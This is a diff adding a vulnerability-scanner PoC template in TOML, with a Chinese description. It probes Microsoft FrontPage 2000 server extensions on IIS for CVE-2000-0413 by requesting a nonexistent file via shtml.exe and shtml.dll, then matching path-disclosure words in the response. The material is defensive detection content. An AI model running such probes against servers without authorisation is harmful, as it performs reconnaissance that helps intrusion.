@@ -1,0 +1,51 @@
+[info]
+author = "AVE"
+description = "发送请求到 shtml.exe 并指定一个不存在的文件，根据错误响应中包含的物理路径字符串判断漏洞是否存在"
+id = "POC-AVE-2000-0341"
+name = "Microsoft FrontPage 2000 IIS 4.0/5.0 Server Extensions 物理路径泄露 PoC"
+severity = "medium"
+tags = [
+    "cve-2000-0413",
+    "frontpage",
+    "iis",
+    "path-disclosure",
+]
+vuln_id = [
+    "CVE-2000-0413",
+    "AVE-2000-0341",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/_vti_bin/shtml.exe/nonexistent.htm"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    ':\',
+    "drive ",
+    "physical",
+    "path",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/_vti_bin/shtml.dll/nonexistent.htm"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    ':\',
+    "drive ",
+    "physical",
+    "path",
+]
